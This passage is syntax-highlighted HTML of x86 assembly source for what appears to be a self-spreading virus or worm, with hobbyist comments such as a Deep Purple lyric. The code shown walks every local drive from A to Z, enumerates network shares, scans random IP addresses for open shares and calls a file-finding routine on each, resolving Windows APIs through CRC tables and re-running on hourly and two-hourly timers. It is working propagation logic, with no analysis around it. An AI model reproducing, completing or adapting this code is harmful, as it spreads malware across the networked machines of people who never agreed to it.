        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cSetCurrentDirectoryA</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_files</span><span class="sc0">

</span><span class="sc5">drive_next</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">drive_loop</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">                  </span><span class="sc1">;1 hour</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cSleep</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_drives</span><span class="sc0">
</span><span class="sc5">find_drives</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">create_thr1</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCreateThread</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_thr2</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;thread 2: find files on network shares using non-recursive algorithm</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_krnapis</span><span class="sc0">

</span><span class="sc5">find_wnet</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">;previous handle</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">;previous node</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">;previous buffer</span><span class="sc0">

</span><span class="sc5">wnet_open</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">RESOURCETYPE_DISK</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">RESOURCE_GLOBALNET</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">netcrcstk.nWNetOpenEnumW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">netcrcstk</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalFree</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">wnet_next</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">wnetlist</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;GMEM_FIXED</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalAlloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wnetlist.wnetprev</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wnetlist.wnethand</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">wnet_next</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">netcrcstk.nWNetEnumResourceW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">netcrcstk</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_MORE_DATA</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">wnet_close</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GMEM_FIXED</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalAlloc</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">wnet_close</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">netcrcstk.nWNetEnumResourceW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">netcrcstk</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">wnet_free</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NETRESOURCE.dwUsage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">RESOURCEUSAGE_CONTAINER</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">wnet_open</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NETRESOURCE.lpRemoteName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kSetCurrentDirectoryW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">wnet_skipdir</span><span class="sc0">

        </span><span class="sc1">;I'm alone here</span><span class="sc0">
        </span><span class="sc1">;with emptiness eagles and snow.</span><span class="sc0">
        </span><span class="sc1">;Unfriendliness chilling my body</span><span class="sc0">
        </span><span class="sc1">;and taunting with pictures of home.</span><span class="sc0">
        </span><span class="sc1">;(Deep Purple)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_files</span><span class="sc0">

</span><span class="sc5">wnet_skipdir</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">wnet_free</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalFree</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">wnet_next</span><span class="sc0">

</span><span class="sc5">wnet_close</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">store_netapi</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'!bgr'</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;WNetCloseEnum</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wnetlist.wnetprev</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">wnet_exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wnetlist.wnethand</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalFree</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">wnet_next</span><span class="sc0">

</span><span class="sc5">wnet_exit</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">120</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">                 </span><span class="sc1">;2 hours</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cSleep</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_wnet</span><span class="sc0">
</span><span class="sc5">find_wnet</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">create_thr2</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCreateThread</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_thr3</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;thread 3: find files on random IP address shares using non-recursive algorithm</span><span class="sc0">
</span><span class="sc1">;(alter class A: 25%, class b: 25%, class c: 25%, class d: scan all)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGetVersion</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'aten'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'23ip'</span><span class="sc0">                     </span><span class="sc1">;"netapi32" (NT/2000/XP)</span><span class="sc0">
        </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">ip_loaddll</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'arvs'</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;"svrapi" (9x/Me)</span><span class="sc0">

</span><span class="sc5">ip_loaddll</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pushfd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cLoadLibraryA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc0">
        </span><span class="sc6">popfd</span><span class="sc0">
        </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">ip_getprocnt</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">init_findmz</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">ip9xcrcbegin</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">ip9xcrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ip9xcrcend</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ip_share</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ip9xcrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">ip_getprocnt</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">init_findmz</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">ipntcrcbegin</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">ipntcrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ipntcrcend</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ip_share</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ipntcrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">ip_share</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;initial IP address</span><span class="sc0">

</span><span class="sc5">find_ip</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">find_ip</span><span class="sc0">                         </span><span class="sc1">;select class A-C only</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                         </span><span class="sc1">;select random class</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;isolate new class</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;remove old class</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">;insert new class</span><span class="sc0">

</span><span class="sc5">ip_save</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;size of Unicode '\\' + Unicode IP address + '\' + ANSI sharename</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;size of '\' + ANSI sharename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGetVersion</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1fh</span><span class="sc0">                        </span><span class="sc1">;0 if Unicode, 1 if ANSI</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;store Unicode sentinel</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;store Unicode half-character</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">;remove character if ANSI</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;convert IP address to string (ANSI or Unicode)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">ip_shift</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">shld</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">ip_hex2dec</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
